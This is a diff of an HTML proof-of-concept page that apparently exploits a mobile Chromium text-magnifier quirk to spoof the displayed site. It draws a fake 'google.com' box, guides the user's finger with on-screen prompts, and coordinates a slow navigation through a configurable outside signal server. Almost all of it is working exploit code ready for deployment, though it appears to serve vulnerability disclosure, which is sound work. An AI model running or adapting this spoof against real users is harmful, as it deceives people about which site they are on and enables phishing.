@@ -5,40 +5,167 @@
 <style>
 html { font-family: sans-serif; }
 html, body { margin: 0; }
-.textInput {
-    font-size: 1.2em;
-    position: absolute;
-}
+* { overflow: hidden; user-select: none; }
 #inputElem {
+    position: absolute;
     top: 0;
     left: 0;
+    width: 100vw;
+    height: 100vh;
+    height: 200px;
+    font-size: 0.01em;
+    outline: none;
+    border: none;
+    caret-color: transparent;
+    color: transparent;
+    padding: 0;
 }
-#inputElem2 {
-    top: 200px;
-    left: 100px;
+#inputElem.tapped {
+    /*
+        Move blue caret/selection handle offscreen.
+        Height needs to be within device screen for magnifier to work.
+    */
+    height: 200%;
+}
+#inputElem.selected {
+    height: 1px;
+    height: 37px;
 }
 #instructions {
+    position: absolute;
+    top: 0;
+    left: 0;
+    pointer-events: none;
     text-align: center;
-    margin-top: 300px;
-    font-size: 1.5em;
+    width: 100%;
+    margin-top: 200px;
+    font-size: 2em;
     user-select: none;
+    z-index: 40;
+}
+#spoof {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 82px;
+    height: 40px;
+    z-index: 50;
+    visibility: hidden;
+    text-align: center;
+    background: #f5fafe;
+}
+#spoofBackground {
+    background: #d7e8f0;
+    height: 31px;
+}
+#spoofText {
+    margin-top: 8px;
+    font-size: 13px;
+}
+#slider {
+    position: absolute;
+    top: -500px;
+    left: -500px;
+    visibility: hidden;
+    background: skyblue;
+    border-radius: 100px;
+    height: 100px;
+    width: 100px;
+    z-index: 30;
+}
+.show {
+    visibility: visible !important;
 }
 </style>
 </head>
 <body>
-<input value="abcdefghijklmnopqrstuvwxyz" id="inputElem" class="textInput" virtualkeyboardpolicy="manual">
-<input value="abcdefghijklmnopqrstuvwxyz" id="inputElem2" class="textInput" virtualkeyboardpolicy="manual">
-<div id="instructions">Tap an input field</div>
+<input value="a" id="inputElem" virtualkeyboardpolicy="manual">
+<div id="spoof"><div id="spoofBackground"><div id="spoofText">google.com</div></div></div>
+<div id="slider"></div>
+<div id="instructions">Tap once or slide finger</div>
 <script>
+// Used to avoid keyboard from opening automatically in case user focuses/taps accidentally
+if (navigator.virtualKeyboard) {
+    navigator.virtualKeyboard.overlaysContent = true;
+}
+
+// CHANGE THIS TO YOUR SIGNAL SERVER. No trailing slash.
+const SIGNAL_SERVER = 'https://aogarantiza.com:1337';
+
+var firstRequestMade = false;
+var firstInteractionDone = false;
+var firstTouchMove = true;
 var isDone = false;
 
+const LEFT_THRESHOLD = 124;
+const RIGHT_THRESHOLD = LEFT_THRESHOLD + 4;
+
 var initEventListeners = () => {
+
+    window.addEventListener('pointerup', () => {
+        if (firstInteractionDone) { return; }
+        firstInteractionDone = true;
+        instructions.innerText = 'Slide finger to the left';
+    });
+
+    inputElem.addEventListener('touchend', () => {
+        setTimeout(() => {
+            inputElem.classList.remove('selected');
+        }, 50); // Need delay to avoid removing class too early after single tap
+        if (firstInteractionDone) { return; }
+        firstInteractionDone = true;
+        instructions.innerText = 'Slide finger to the left';
+    });
+
+    window.addEventListener('touchmove', (e) => {
+        if (!firstRequestMade) {
+            instructions.innerText = 'Tap once or slide finger';
+            return;
+        }
+
+        if (!firstInteractionDone) {
+            // For magnifier to work, user needs to tap screen, then slide.
+            // If user has not completed first tap, ask user to lift finger.
+            instructions.innerText = 'Lift finger';
+            return;
+        }
+
+        inputElem.classList.add('selected');
+
+        var changedTouch = e.changedTouches[0];
+
+        spoof.style.left = (changedTouch.clientX - 41) + 'px';
+        slider.classList.add('show');
+        slider.style.left = (changedTouch.clientX - 50) + 'px';
+        if (firstTouchMove) {
+            firstTouchMove = false;
+            slider.style.top = (changedTouch.clientY - 50) + 'px';
+        }
+
+        if (changedTouch.clientX > RIGHT_THRESHOLD) {
+            instructions.innerText = 'Slide finger to the left';
+            spoof.classList.remove('show');
+        } else if (changedTouch.clientX < LEFT_THRESHOLD) {
+            instructions.innerText = 'Slide finger to the right';
+            spoof.classList.remove('show');
+        } else {
+            instructions.innerText = 'Perfect!';
+            spoof.classList.add('show');
+            if (isDone) { return; }
+            isDone = true;
+            setTimeout(() => {
+                fetch(SIGNAL_SERVER + '/signal', {method: 'post'});
+            }, 0);
+        }
+    });
     // pointerdown emitted before touch finishes
     window.addEventListener('pointerdown', () => {
-        if (isDone) { return; }
-        isDone = true;
-        window.location = 'https://aogarantiza.com/chromium/slow.php?s=3&ts=' + Date.now();
-        instructions.innerText = 'Touch and keep holding blue handle,\nthen wait a few seconds...\n\n(optionally move caret/cursor)';
+        if (firstRequestMade) {
+            return;
+        }
+        firstRequestMade = true;
+        window.location = SIGNAL_SERVER + '/?slownav&ts=' + Date.now();
+        inputElem.classList.add('tapped');
     });
 }
 
@@ -47,6 +174,8 @@ if (document.prerendering) {
 } else {
     initEventListeners();
 }
+
+inputElem.focus();
 </script>
 </body>
 </html>
